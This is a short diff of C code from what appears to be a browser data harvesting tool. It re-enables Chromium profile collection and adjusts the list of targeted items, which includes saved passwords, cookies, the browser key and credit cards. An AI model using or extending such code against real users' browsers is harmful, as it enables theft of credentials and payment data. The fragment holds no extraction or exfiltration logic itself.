@@ -81,7 +81,7 @@ BOOL ChromiumWalk
 	DWORD j = 0;
 	DWORD k = 0;
 	LPWSTR lpFileName = NULL;
-	ProfileItem DefaultChromiumItems[] = { ChromiumKey, ChromiumPassword, ChromiumCookie, ChromiumBookmark, ChromiumHistory, ChromiumDownload, ChromiumCreditCard, ChromiumLocalStorage, ChromiumSessionStorage, ChromiumExtension };
+	ProfileItem DefaultChromiumItems[] = { ChromiumKey, ChromiumPassword, ChromiumCookie, ChromiumBookmark, ChromiumHistory, ChromiumDownload, ChromiumCreditCard, ChromiumSessionStorage, ChromiumExtension };
 	LPWSTR lpTemp = NULL;
 	LPWSTR lpTemp2 = NULL;
 	LPWSTR lpProfilePath = NULL;
@@ -400,7 +400,7 @@ PUSER_DATA* PickBrowsers
 	PUSER_DATA pFireFoxData = NULL;
 	DWORD dwNumberOfUserDatas = 0;
 
-	//pResult = PickChromium(&dwNumberOfUserDatas);
+	pResult = PickChromium(&dwNumberOfUserDatas);
 	pFireFoxData = PickFireFox();
 	if (pFireFoxData != NULL) {
 		if (pResult != NULL) {
